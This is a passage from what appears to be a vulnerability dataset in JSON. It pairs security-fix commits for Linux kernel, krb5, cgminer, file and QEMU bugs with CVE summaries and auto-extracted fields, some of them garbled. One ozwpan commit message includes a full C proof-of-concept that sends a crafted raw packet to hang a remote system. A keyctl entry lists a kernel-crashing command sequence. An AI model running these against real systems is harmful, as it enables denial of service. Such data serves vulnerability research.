<davem@davemloft.net>","summary":"The Bluetooth protocol stack in the Linux kernel before 3.6 does not properly initialize certain structures, which allows local users to obtain sensitive information from kernel stack memory via a crafted application that targets the (1) L2CAP or (2) HCI implementation.","commit_message_1":"l2cap - fix info leak via getsockname ( ) the l2cap code fails to initialize the l2_bdaddr_type member of struct sockaddr_l2 and the padding byte added for alignment","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application that targets the l2cap or hci implementation","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not properly initialize certain structures","Attack Type":"local attacker"},{"commit_id":"3f68ba07b1da811bf383b4b701b129bfcb2e4988","cve_id":"CVE-2012-6544","cwe_id":"CWE-200","commit_message":"Bluetooth: HCI - Fix info leak via getsockname()\n\nThe HCI code fails to initialize the hci_channel member of struct\nsockaddr_hci and that for leaks two bytes kernel stack via the\ngetsockname() syscall. Initialize hci_channel with 0 to avoid the\ninfo leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: Marcel Holtmann <marcel@holtmann.org>\nCc: Gustavo Padovan <gustavo@padovan.org>\nCc: Johan Hedberg <johan.hedberg@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The Bluetooth protocol stack in the Linux kernel before 3.6 does not properly initialize certain structures, which allows local users to obtain sensitive information from kernel stack memory via a crafted application that targets the (1) L2CAP or (2) HCI implementation.","commit_message_1":"hci - fix info leak via getsockname ( ) the hci code fails to initialize the hci_channel member of struct sockaddr_hci and that for leak two byte kernel stack via the getsockname ( ) syscall","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application that targets the l2cap or hci implementation","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not properly initialize certain structures","Attack Type":"local attacker"},{"commit_id":"1f86840f897717f86d523a13e99a447e6a5d2fa5","cve_id":"CVE-2012-6537","cwe_id":"CWE-200","commit_message":"xfrm_user: fix info leak in copy_to_user_tmpl()\n\nThe memory used for the template copy is a local stack variable. As\nstruct xfrm_user_tmpl contains multiple holes added by the compiler for\nalignment, not initializing the memory will lead to leaking stack bytes\nto userland. Add an explicit memset(0) to avoid the info leak.\n\nInitial version of the patch by Brad Spengler.\n\nCc: Brad Spengler <spender@grsecurity.net>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Steffen Klassert <steffen.klassert@secunet.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/xfrm\/xfrm_user.c in the Linux kernel before 3.6 does not initialize certain structures, which allows local users to obtain sensitive information from kernel memory by leveraging the CAP_NET_ADMIN capability.","commit_message_1":"fix info leak in copy_to_user_tmpl ( ) the memory used for the template copy is a local stack variable","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by leveraging the cap _ net _ admin capability","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not initialize certain structures","Attack Type":"local attacker"},{"commit_id":"7b789836f434c87168eab067cfbed1ec4783dffd","cve_id":"CVE-2012-6537","cwe_id":"CWE-200","commit_message":"xfrm_user: fix info leak in copy_to_user_policy()\n\nThe memory reserved to dump the xfrm policy includes multiple padding\nbytes added by the compiler for alignment (padding bytes in struct\nxfrm_selector and struct xfrm_userpolicy_info). Add an explicit\nmemset(0) before filling the buffer to avoid the heap info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Steffen Klassert <steffen.klassert@secunet.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/xfrm\/xfrm_user.c in the Linux kernel before 3.6 does not initialize certain structures, which allows local users to obtain sensitive information from kernel memory by leveraging the CAP_NET_ADMIN capability.","commit_message_1":"fix info leak in copy_to_user_policy ( ) the memory reserved to dump the xfrm policy includes multiple padding byte added by the compiler for alignment ( padding byte in struct xfrm_selector and struct xfrm_userpolicy_info )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by leveraging the cap _ net _ admin capability","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not initialize certain structures","Attack Type":"local attacker"},{"commit_id":"b4c01141e5367f247b84dcaf6aefbb4e741842b8","cve_id":"CVE-2014-8116","cwe_id":"CWE-399","commit_message":"- limit the number of program and section header number of sections to be\n  processed to avoid excessive processing time.\n- if a bad note is found, return 0 to stop processing immediately.","summary":"The ELF parser (readelf.c) in file before 5.21 allows remote attackers to cause a denial of service (CPU consumption or crash) via a large number of (1) program or (2) section headers or (3) invalid capabilities.","commit_message_1":"- limit the number of program and section header number of section to be processed to avoid excessive processing time","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a large number of program or  section headers or invalid capabilities","Impact":"cause a denial of service ( cpu consumption or crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"883a1d49f0d77d30012f114b2e19fc141beb3e8e","cve_id":"CVE-2014-4656","cwe_id":"CWE-189","commit_message":"ALSA: control: Make sure that id->index does not overflow\n\nThe ALSA control code expects that the range of assigned indices to a control is\ncontinuous and does not overflow. Currently there are no checks to enforce this.\nIf a control with a overflowing index range is created that control becomes\neffectively inaccessible and unremovable since snd_ctl_find_id() will not be\nable to find it. This patch adds a check that makes sure that controls with a\noverflowing index range can not be created.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>\nAcked-by: Jaroslav Kysela <perex@perex.cz>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"Multiple integer overflows in sound\/core\/control.c in the ALSA control implementation in the Linux kernel before 3.15.2 allow local users to cause a denial of service by leveraging \/dev\/snd\/controlCX access, related to (1) index values in the snd_ctl_add function and (2) numid values in the snd_ctl_remove_numid_conflict function.","commit_message_1":"control : make sure that id- > index doe not overflow the alsa control code expects that the range of assigned index to a control is continuous and doe not overflow","Vulnerability Type":"integer overflow","Attack Vector":"by leveraging \/ dev \/ snd \/ controlcx access , related to ( 1 ) index values in the snd _ ctl _ add function and ( 2 ) numid values in the snd _ ctl _ remove _ numid _ conflict function","Impact":"cause a denial of service","Root Cause":"caused by improper bounds checking by the snd_ctl_add() and snd_ctl_remove_numid_conflict() functions","Attack Type":"local attacker"},{"commit_id":"ff7f30129f15f7a2213f8ced0cd65c9a331493d9","cve_id":"CVE-2014-4502","cwe_id":"CWE-119","commit_message":"Bugfix: initiate_stratum: Ensure extranonce2 size is not negative (which could lead to exploits later as too little memory gets allocated)\n\nThanks to Mick Ayzenberg <mick@dejavusecurity.com> for finding this!","summary":"Multiple heap-based buffer overflows in the parse_notify function in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 4.1.0 allow remote pool servers to have unspecified impact via a (1) large or (2) negative value in the Extranonc2_size parameter in a mining.subscribe response and a crafted mining.notify request.","commit_message_1":"initiate_stratum : ensure extranonce2 size is not negative ( which could lead to exploit later a too little memory get allocated ) thanks to mick ayzenberg < mick @ <file> > for finding this !","Vulnerability Type":"buffer overflow","Attack Vector":"via a ( 1 ) large or ( 2 ) negative value in the extranonc2 _ size parameter in a mining . subscribe response and a crafted mining . notify request . impact","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking when handling malicious messages","Attack Type":"remote attacker"},{"commit_id":"bac5831b355f916e0696b7bbcccfc51c057b729a","cve_id":"CVE-2014-4502","cwe_id":"CWE-119","commit_message":"Bugfix: initiate_stratum: Ensure extranonce2 size is not negative (which could lead to exploits later as too little memory gets allocated)\n\nThanks to Mick Ayzenberg <mick@dejavusecurity.com> for finding this!","summary":"Multiple heap-based buffer overflows in the parse_notify function in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 4.1.0 allow remote pool servers to have unspecified impact via a (1) large or (2) negative value in the Extranonc2_size parameter in a mining.subscribe response and a crafted mining.notify request.","commit_message_1":"initiate_stratum : ensure extranonce2 size is not negative ( which could lead to exploit later a too little memory get allocated ) thanks to mick ayzenberg < mick @ <file> > for finding this !","Vulnerability Type":"buffer overflow","Attack Vector":"via a ( 1 ) large or ( 2 ) negative value in the extranonc2 _ size parameter in a mining . subscribe response and a crafted mining . notify request . impact","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking when handling malicious messages","Attack Type":"remote attacker"},{"commit_id":"78cc408369bdbbd440196c93574098d1482efbce","cve_id":"CVE-2014-4501","cwe_id":"CWE-119","commit_message":"stratum: parse_reconnect(): treat pool-sent URL as untrusted.\n\nThanks to Mick Ayzenberg <mick@dejavusecurity.com> for reminding\nthat this existed and highlighting the offender.\n\nAlso to Luke-jr for actually fixing this in bfgminer. :D","summary":"Multiple stack-based buffer overflows in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 3.3.0 allow remote pool servers to have unspecified impact via a long URL in a client.reconnect stratum message to the (1) extract_sockaddr or (2) parse_reconnect functions in util.c.","commit_message_1":"parse_reconnect ( ) : treat pool-sent url a untrusted","Vulnerability Type":"buffer overflow","Attack Vector":"via a long url in a client . reconnect stratum message to the ( 1 ) extract _ sockaddr or ( 2 ) parse _ reconnect functions in util . c","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking when handling malicious messages","Attack Type":"remote attacker"},{"commit_id":"c80ad8548251eb0e15329fc240c89070640c9d79","cve_id":"CVE-2014-4501","cwe_id":"CWE-119","commit_message":"Stratum: extract_sockaddr: Truncate overlong addresses rather than stack overflow\n\nThanks to Mick Ayzenberg <mick@dejavusecurity.com> for finding this!","summary":"Multiple stack-based buffer overflows in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 3.3.0 allow remote pool servers to have unspecified impact via a long URL in a client.reconnect stratum message to the (1) extract_sockaddr or (2) parse_reconnect functions in util.c.","commit_message_1":"extract_sockaddr : truncate overlong address rather than stack overflow thanks to mick ayzenberg < mick @ <file> > for finding this !","Vulnerability Type":"buffer overflow","Attack Vector":"via a long url in a client . reconnect stratum message to the ( 1 ) extract _ sockaddr or ( 2 ) parse _ reconnect functions in util . c","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking when handling malicious messages","Attack Type":"remote attacker"},{"commit_id":"524688ce87a15fc75f87efc8c039ba4c7d5c197b","cve_id":"CVE-2014-4344","cwe_id":"CWE-476","commit_message":"Fix null deref in SPNEGO acceptor [CVE-2014-4344]\n\nWhen processing a continuation token, acc_ctx_cont was dereferencing\nthe initial byte of the token without checking the length.  This could\nresult in a null dereference.\n\nCVE-2014-4344:\n\nIn MIT krb5 1.5 and newer, an unauthenticated or partially\nauthenticated remote attacker can cause a NULL dereference and\napplication crash during a SPNEGO negotiation by sending an empty\ntoken as the second or later context token from initiator to acceptor.\nThe attacker must provide at least one valid context token in the\nsecurity context negotiation before sending the empty token.  This can\nbe done by an unauthenticated attacker by forcing SPNEGO to\nrenegotiate the underlying mechanism, or by using IAKERB to wrap an\nunauthenticated AS-REQ as the first token.\n\n    CVSSv2 Vector: AV:N\/AC:L\/Au:N\/C:N\/I:N\/A:C\/E:POC\/RL:OF\/RC:C\n\n[kaduk@mit.edu: CVE summary, CVSSv2 vector]\n\nticket: 7970 (new)\nsubject: NULL dereference in SPNEGO acceptor for continuation tokens [CVE-2014-4344]\ntarget_version: 1.12.2\ntags: pullup","summary":"The acc_ctx_cont function in the SPNEGO acceptor in lib\/gssapi\/spnego\/spnego_mech.c in MIT Kerberos 5 (aka krb5) 1.5.x through 1.12.x before 1.12.2 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via an empty continuation token at a certain point during a SPNEGO negotiation.","commit_message_1":"fix null deref in spnego acceptor [ <cve_id> ] when processing a continuation token , acc_ctx_cont wa dereferencing the initial byte of the token without checking the length","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via an empty continuation token at a certain","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"within the SPNEGO Acceptor for Continuation Tokens","Attack Type":"remote attacker"},{"commit_id":"234f3ce485d54017f15cf5e0699cff4100121601","cve_id":"CVE-2014-3647","cwe_id":"CWE-264","commit_message":"KVM: x86: Emulator fixes for eip canonical checks on near branches\n\nBefore changing rip (during jmp, call, ret, etc.) the target should be asserted\nto be canonical one, as real CPUs do.  During sysret, both target rsp and rip\nshould be canonical. If any of these values is noncanonical, a #GP exception\nshould occur.  The exception to this rule are syscall and sysenter instructions\nin which the assigned rip is checked during the assignment to the relevant\nMSRs.\n\nThis patch fixes the emulator to behave as real CPUs do for near branches.\nFar branches are handled by the next patch.\n\nThis fixes CVE-2014-3647.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Nadav Amit <namit@cs.technion.ac.il>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"arch\/x86\/kvm\/emulate.c in the KVM subsystem in the Linux kernel through 3.17.2 does not properly perform RIP changes, which allows guest OS users to cause a denial of service (guest OS crash) via a crafted application.","commit_message_1":"x86 : emulator fix for eip canonical check on near branch before changing rip ( during jmp , call , ret , etc","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( guest os crash )","Root Cause":"does not properly perform rip changes","Attack Type":"local attacker"},{"commit_id":"0641e56be1af003aa02c7c6b0184466540637233","cve_id":"CVE-2014-3587","cwe_id":"CWE-189","commit_message":"Prevent wrap around (Remi Collet at redhat)","summary":"Integer overflow in the cdf_read_property_info function in cdf.c in file through 5.19, as used in the Fileinfo component in PHP before 5.4.32 and 5.5.x before 5.5.16, allows remote attackers to cause a denial of service (application crash) via a crafted CDF file.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2012-1571.","commit_message_1":"prevent wrap around ( remi collet at redhat )","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted cdf file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an incomplete fix related to the cdf_read_property_info() function","Attack Type":"remote attacker"},{"commit_id":"74cafd7de9ec99a14f4480927580e501c8f852c3","cve_id":"CVE-2014-3538","cwe_id":"CWE-399","commit_message":"If requested, limit search length.","summary":"file before 5.19 does not properly restrict the amount of data read during a regex search, which allows remote attackers to cause a denial of service (CPU consumption) via a crafted file that triggers backtracking during processing of an awk rule.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-7345.","commit_message_1":"if requested , limit search length","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted file that triggers backtracking during processing of an awk rule","Impact":"cause a denial of service ( cpu consumption )","Root Cause":"does not properly restrict the amount of data read during a regex search","Attack Type":"remote attacker"},{"commit_id":"103b40f51e4012b3b0ad20f615562a1806d7f49a","cve_id":"CVE-2011-3346","cwe_id":"CWE-119","commit_message":"scsi-disk: commonize iovec creation between reads and writes\n\nAlso, consistently use qiov.size instead of iov.iov_len.\n\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\nSigned-off-by: Kevin Wolf <kwolf@redhat.com>","summary":"Buffer overflow in hw\/scsi-disk.c in the SCSI subsystem in QEMU before 0.15.2, as used by Xen, might allow local guest users with permission to access the CD-ROM to cause a denial of service (guest crash) via a crafted SAI READ CAPACITY SCSI command.  NOTE: this is only a vulnerability when root has manually modified certain permissions or ACLs.","commit_message_1":"commonize iovec creation between read and writes also , consistently use <file> instead of <file>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted sai read capacity scsi command","Impact":"access the cd - rom to cause a denial of service ( guest crash )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"f05819df10d7b09f6d1eb6f8534a8f68e5a4fe61","cve_id":"CVE-2015-7872","cwe_id":"CWE-20","commit_message":"KEYS: Fix crash when attempt to garbage collect an uninstantiated keyring\n\nThe following sequence of commands:\n\n    i=`keyctl add user a a @s`\n    keyctl request2 keyring foo bar @t\n    keyctl unlink $i @s\n\ntries to invoke an upcall to instantiate a keyring if one doesn't already\nexist by that name within the user's keyring set.  However, if the upcall\nfails, the code sets keyring->type_data.reject_error to -ENOKEY or some\nother error code.  When the key is garbage collected, the key destroy\nfunction is called unconditionally and keyring_destroy() uses list_empty()\non keyring->type_data.link - which is in a union with reject_error.\nSubsequently, the kernel tries to unlink the keyring from the keyring names\nlist - which oopses like this:\n\n\tBUG: unable to handle kernel paging request at 00000000ffffff8a\n\tIP: [<ffffffff8126e051>] keyring_destroy+0x3d\/0x88\n\t...\n\tWorkqueue: events key_garbage_collector\n\t...\n\tRIP: 0010:[<ffffffff8126e051>] keyring_destroy+0x3d\/0x88\n\tRSP: 0018:ffff88003e2f3d30  EFLAGS: 00010203\n\tRAX: 00000000ffffff82 RBX: ffff88003bf1a900 RCX: 0000000000000000\n\tRDX: 0000000000000000 RSI: 000000003bfc6901 RDI: ffffffff81a73a40\n\tRBP: ffff88003e2f3d38 R08: 0000000000000152 R09: 0000000000000000\n\tR10: ffff88003e2f3c18 R11: 000000000000865b R12: ffff88003bf1a900\n\tR13: 0000000000000000 R14: ffff88003bf1a908 R15: ffff88003e2f4000\n\t...\n\tCR2: 00000000ffffff8a CR3: 000000003e3ec000 CR4: 00000000000006f0\n\t...\n\tCall Trace:\n\t [<ffffffff8126c756>] key_gc_unused_keys.constprop.1+0x5d\/0x10f\n\t [<ffffffff8126ca71>] key_garbage_collector+0x1fa\/0x351\n\t [<ffffffff8105ec9b>] process_one_work+0x28e\/0x547\n\t [<ffffffff8105fd17>] worker_thread+0x26e\/0x361\n\t [<ffffffff8105faa9>] ? rescuer_thread+0x2a8\/0x2a8\n\t [<ffffffff810648ad>] kthread+0xf3\/0xfb\n\t [<ffffffff810647ba>] ? kthread_create_on_node+0x1c2\/0x1c2\n\t [<ffffffff815f2ccf>] ret_from_fork+0x3f\/0x70\n\t [<ffffffff810647ba>] ? kthread_create_on_node+0x1c2\/0x1c2\n\nNote the value in RAX.  This is a 32-bit representation of -ENOKEY.\n\nThe solution is to only call ->destroy() if the key was successfully\ninstantiated.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nSigned-off-by: David Howells <dhowells@redhat.com>\nTested-by: Dmitry Vyukov <dvyukov@google.com>","summary":"The key_gc_unused_keys function in security\/keys\/gc.c in the Linux kernel through 4.2.6 allows local users to cause a denial of service (OOPS) via crafted keyctl commands.","commit_message_1":"fix crash when attempt to garbage collect an uninstantiated keyring the following sequence of command : i= ` keyctl add user a a @ s ` keyctl request2 keyring foo bar @ t keyctl unlink $ i @ s try to invoke an upcall to instantiate a keyring if one doe n't already exist by that name within the user 's keyring set","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted keyctl commands","Impact":"cause a denial of service ( oops )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"fdc81f45e9f57858da6351836507fbcf1b7583ee","cve_id":"CVE-2015-5707","cwe_id":"CWE-189","commit_message":"sg_start_req(): use import_iovec()\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"Integer overflow in the sg_start_req function in drivers\/scsi\/sg.c in the Linux kernel 2.6.x through 4.x before 4.1 allows local users to cause a denial of service or possibly have unspecified other impact via a large iov_count value in a write request.","commit_message_1":"sg_start_req ( ) : use import_iovec ( )","Vulnerability Type":"integer overflow","Attack Vector":"via a large iov _ count value in a write request","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"9a59029bc218b48eff8b5d4dde5662fd79d3e1a8","cve_id":"CVE-2015-4002","cwe_id":"CWE-119","commit_message":"ozwpan: unchecked signed subtraction leads to DoS\n\nThe subtraction here was using a signed integer and did not have any\nbounds checking at all. This commit adds proper bounds checking, made\neasy by use of an unsigned integer. This way, a single packet won't be\nable to remotely trigger a massive loop, locking up the system for a\nconsiderable amount of time. A PoC follows below, which requires\nozprotocol.h from this module.\n\n=-=-=-=-=-=\n\n #include <arpa\/inet.h>\n #include <linux\/if_packet.h>\n #include <net\/if.h>\n #include <netinet\/ether.h>\n #include <stdio.h>\n #include <string.h>\n #include <stdlib.h>\n #include <endian.h>\n #include <sys\/ioctl.h>\n #include <sys\/socket.h>\n\n #define u8 uint8_t\n #define u16 uint16_t\n #define u32 uint32_t\n #define __packed __attribute__((__packed__))\n #include \"ozprotocol.h\"\n\nstatic int hex2num(char c)\n{\n\tif (c >= '0' && c <= '9')\n\t\treturn c - '0';\n\tif (c >= 'a' && c <= 'f')\n\t\treturn c - 'a' + 10;\n\tif (c >= 'A' && c <= 'F')\n\t\treturn c - 'A' + 10;\n\treturn -1;\n}\nstatic int hwaddr_aton(const char *txt, uint8_t *addr)\n{\n\tint i;\n\tfor (i = 0; i < 6; i++) {\n\t\tint a, b;\n\t\ta = hex2num(*txt++);\n\t\tif (a < 0)\n\t\t\treturn -1;\n\t\tb = hex2num(*txt++);\n\t\tif (b < 0)\n\t\t\treturn -1;\n\t\t*addr++ = (a << 4) | b;\n\t\tif (i < 5 && *txt++ != ':')\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n\nint main(int argc, char *argv[])\n{\n\tif (argc < 3) {\n\t\tfprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);\n\t\treturn 1;\n\t}\n\n\tuint8_t dest_mac[6];\n\tif (hwaddr_aton(argv[2], dest_mac)) {\n\t\tfprintf(stderr, \"Invalid mac address.\\n\");\n\t\treturn 1;\n\t}\n\n\tint sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);\n\tif (sockfd < 0) {\n\t\tperror(\"socket\");\n\t\treturn 1;\n\t}\n\n\tstruct ifreq if_idx;\n\tint interface_index;\n\tstrncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);\n\tif (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFINDEX\");\n\t\treturn 1;\n\t}\n\tinterface_index = if_idx.ifr_ifindex;\n\tif (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFHWADDR\");\n\t\treturn 1;\n\t}\n\tuint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_elt_connect_req oz_elt_connect_req;\n\t\tstruct oz_elt oz_elt2;\n\t\tstruct oz_multiple_fixed oz_multiple_fixed;\n\t} __packed packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(0)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_CONNECT_REQ,\n\t\t\t.length = sizeof(struct oz_elt_connect_req)\n\t\t},\n\t\t.oz_elt_connect_req = {\n\t\t\t.mode = 0,\n\t\t\t.resv1 = {0},\n\t\t\t.pd_info = 0,\n\t\t\t.session_id = 0,\n\t\t\t.presleep = 0,\n\t\t\t.ms_isoc_latency = 0,\n\t\t\t.host_vendor = 0,\n\t\t\t.keep_alive = 0,\n\t\t\t.apps = htole16((1 << OZ_APPID_USB) | 0x1),\n\t\t\t.max_len_div16 = 0,\n\t\t\t.ms_per_isoc = 0,\n\t\t\t.up_audio_buf = 0,\n\t\t\t.ms_per_elt = 0\n\t\t},\n\t\t.oz_elt2 = {\n\t\t\t.type = OZ_ELT_APP_DATA,\n\t\t\t.length = sizeof(struct oz_multiple_fixed) - 3\n\t\t},\n\t\t.oz_multiple_fixed = {\n\t\t\t.app_id = OZ_APPID_USB,\n\t\t\t.elt_seq_num = 0,\n\t\t\t.type = OZ_USB_ENDPOINT_DATA,\n\t\t\t.endpoint = 0,\n\t\t\t.format = OZ_DATA_F_MULTIPLE_FIXED,\n\t\t\t.unit_size = 1,\n\t\t\t.data = {0}\n\t\t}\n\t};\n\n\tstruct sockaddr_ll socket_address = {\n\t\t.sll_ifindex = interface_index,\n\t\t.sll_halen = ETH_ALEN,\n\t\t.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t};\n\n\tif (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\treturn 0;\n}\n\nSigned-off-by: Jason A. Donenfeld <Jason@zx2c4.com>\nAcked-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"drivers\/staging\/ozwpan\/ozusbsvc1.c in the OZWPAN driver in the Linux kernel through 4.0.5 does not ensure that certain length values are sufficiently large, which allows remote attackers to cause a denial of service (system crash or large loop) or possibly execute arbitrary code via a crafted packet, related to the (1) oz_usb_rx and (2) oz_usb_handle_ep_data functions.","commit_message_1":"unchecked signed subtraction lead to do the subtraction here wa using a signed integer and did not have any bound checking at all","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted packet , related to the ( 1 ) oz _ usb _ rx and ( 2 ) oz _ usb _ handle _ ep _ data functions","Impact":"cause a denial of service ( system crash or large loop ) or possibly execute arbitrary code","Root Cause":"does not ensure that certain length values are sufficiently large","Attack Type":"remote attacker"},{"commit_id":"4606c28f494a750892c5c1ac7903e62dd1c6fdb5","cve_id":"CVE-2015-3885","cwe_id":"CWE-189","commit_message":"0.16.1: fix for dcraw ljpeg_start() vulnerability","summary":"Integer overflow in the ljpeg_start function in dcraw 7.00 and earlier allows remote attackers to cause a denial of service (crash) via a crafted image, which triggers a buffer overflow, related to the len variable.","commit_message_1":"<file>","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted image , which triggers a buffer overflow , related to the len variable","Impact":"cause a denial of service ( crash )","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"cde93be45a8a90d8c264c776fab63487b5038a65","cve_id":"CVE-2015-2925","cwe_id":"CWE-254","commit_message":"dcache: Handle escaped paths in prepend_path\n\nA rename can result in a dentry that by walking up d_parent\nwill never reach it's mnt_root.  For lack of a better term\nI call this an escaped path.\n\nprepend_path is called by four different functions __d_path,\nd_absolute_path, d_path, and getcwd.\n\n__d_path only wants to see paths are connected to the root it passes\nin.  So __d_path needs prepend_path to return an error.\n\nd_absolute_path similarly wants to see paths that are connected to\nsome root.  Escaped paths are not connected to any mnt_root so\nd_absolute_path needs prepend_path to return an error greater\nthan 1.  So escaped paths will be treated like paths on lazily\nunmounted mounts.\n\ngetcwd needs to prepend \"(unreachable)\" so getcwd also needs\nprepend_path to return an error.\n\nd_path is the interesting hold out.  d_path just wants to print\nsomething, and does not care about the weird cases.  Which raises\nthe question what should be printed?\n\nGiven that <escaped_path>\/<anything> should result in -ENOENT I\nbelieve it is desirable for escaped paths to be printed as empty\npaths.  As there are not really any meaninful path components when\nconsidered from the perspective of a mount tree.\n\nSo tweak prepend_path to return an empty path with an new error\ncode of 3 when it encounters an escaped path.\n\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The prepend_path function in fs\/dcache.c in the Linux kernel before 4.2.4 does not properly handle rename actions inside a bind mount, which allows local users to bypass an intended container protection mechanism by renaming a directory, related to a *double-chroot attack.*","commit_message_1":"handle escaped path in prepend_path a rename can result in a dentry that by walking up d_parent will never reach it 's mnt_root","Vulnerability Type":"Security Features","Attack Vector":"By creating another user and mounting namespace within a container","Impact":"bypass an intended container protection mechanism","Root Cause":"does not properly handle rename actions inside a bind mount","Attack Type":"local attacker"},{"commit_id":"637b58c2887e5e57850865839cc75f59184b23d1","cve_id":"CVE-2015-1805","cwe_id":"CWE-17","commit_message":"switch pipe_read() to copy_page_to_iter()\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The (1) pipe_read and (2) pipe_write implementations in fs\/pipe.c in the Linux kernel before 3.16 do not properly consider the side effects of failed __copy_to_user_inatomic and __copy_from_user_inatomic calls, which allows local users to cause a denial of service (system crash) or possibly gain privileges via a crafted application, aka an *I\/O vector array overrun.*","commit_message_1":"switch pipe_read ( ) to copy_page_to_iter ( )","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"via a crafted application , aka an * i \/ o vector array overrun . *","Impact":"cause a denial of service ( system crash ) or possibly gain privileges","Root Cause":"do not properly consider the side effects of failed _ _ copy _ to _ user _ inatomic and _ _ copy _ from _ user _ inatomic calls","Attack Type":"local attacker"},{"commit_id":"a1d47b262952a45aae62bd49cfaf33dd76c11a2c","cve_id":"CVE-2014-9728","cwe_id":"CWE-119","commit_message":"udf: Verify symlink size before loading it\n\nUDF specification allows arbitrarily large symlinks. However we support\nonly symlinks at most one block large. Check the length of the symlink\nso that we don't access memory beyond end of the symlink block.\n\nCC: stable@vger.kernel.org\nReported-by: Carl Henrik Lunde <chlunde@gmail.com>\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"The UDF filesystem implementation in the Linux kernel before 3.18.2 does not validate certain lengths, which allows local users to cause a denial of service (buffer over-read and system crash) via a crafted filesystem image, related to fs\/udf\/inode.c and fs\/udf\/symlink.c.","commit_message_1":"verify symlink size before loading it udf specification allows arbitrarily large symlinks","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted filesystem image , related to fs \/ udf \/ inode . c and fs \/ udf \/ symlink . c","Impact":"cause a denial of service ( buffer over - read and system crash )","Root Cause":"does not validate certain lengths","Attack Type":"local 